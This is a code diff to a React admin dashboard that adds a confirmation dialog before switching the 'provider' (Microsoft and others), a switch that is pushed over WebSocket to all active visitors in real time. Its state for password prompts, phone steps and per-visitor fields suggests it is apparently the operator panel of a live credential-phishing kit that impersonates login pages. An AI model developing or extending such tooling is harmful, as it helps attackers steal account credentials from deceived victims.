@@ -423,6 +423,7 @@ function VisitorModal({
 
 export default function AdminPage() {
   const [provider, setProvider] = useState<Provider>('microsoft');
+  const [pendingProvider, setPendingProvider] = useState<Provider | null>(null);
   const [device, setDevice] = useState<Device>('desktop');
   const [theme, setTheme] = useState<Theme>('light');
   const [prompt, setPrompt] = useState<Prompt>('password');
@@ -503,6 +504,17 @@ export default function AdminPage() {
     }
   };
 
+  const confirmProviderSwitch = (p: Provider) => {
+    setProvider(p);
+    setPreviewKey(k => k + 1);
+    if (p !== 'microsoft') { setPrompt('password'); setPhoneEnabled(false); }
+    const ws = wsRef.current;
+    if (ws?.readyState === WebSocket.OPEN) {
+      ws.send(JSON.stringify({ type: 'switch-provider', provider: p }));
+    }
+    setPendingProvider(null);
+  };
+
   const deleteField = (visitorId: string, field: string) => {
     const ws = wsRef.current;
     if (ws?.readyState === WebSocket.OPEN) {
@@ -549,6 +561,38 @@ export default function AdminPage() {
   return (
     <div className="flex h-screen w-full overflow-hidden bg-[#0b0c10] text-[#ececf1] font-sans">
 
+      {/* Provider switch confirmation */}
+      {pendingProvider && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center p-4" style={{ backgroundColor: 'rgba(0,0,0,0.75)', backdropFilter: 'blur(4px)' }}>
+          <div className="bg-[#16181d] border border-[#2d3139] rounded-2xl shadow-2xl w-full max-w-sm p-6 flex flex-col gap-5">
+            <div className="flex items-center gap-3">
+              <div className="w-10 h-10 rounded-xl bg-white flex items-center justify-center flex-shrink-0 shadow">
+                {providers.find(p => p.id === pendingProvider)?.icon}
+              </div>
+              <div>
+                <p className="text-white font-semibold text-[15px] leading-snug">Switch to {providers.find(p => p.id === pendingProvider)?.name}?</p>
+                <p className="text-[12px] text-[#8a919e] mt-0.5">All active visitors will be switched in real time</p>
+              </div>
+            </div>
+            <div className="flex gap-3">
+              <button
+                onClick={() => setPendingProvider(null)}
+                className="flex-1 py-2.5 rounded-xl border border-[#2d3139] text-[13px] font-semibold text-[#aeb5c0] hover:bg-[#1e2128] transition-colors"
+              >
+                Cancel
+              </button>
+              <button
+                onClick={() => confirmProviderSwitch(pendingProvider)}
+                className="flex-1 py-2.5 rounded-xl text-[13px] font-semibold text-white transition-colors"
+                style={{ backgroundColor: PROVIDER_COLORS[pendingProvider] }}
+              >
+                Yes, switch
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
       {/* Modal */}
       {modalVisitor && (
         <VisitorModal
@@ -580,7 +624,7 @@ export default function AdminPage() {
                 return (
                   <button
                     key={p.id}
-                    onClick={() => { setProvider(p.id); setPreviewKey(k => k + 1); if (p.id !== 'microsoft') { setPrompt('password'); setPhoneEnabled(false); } }}
+                    onClick={() => { if (p.id !== provider) setPendingProvider(p.id); }}
                     data-testid={`provider-btn-${p.id}`}
                     className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all text-left ${provider === p.id ? 'bg-[#23262f]' : 'hover:bg-[#1e2128]'}`}
                   >
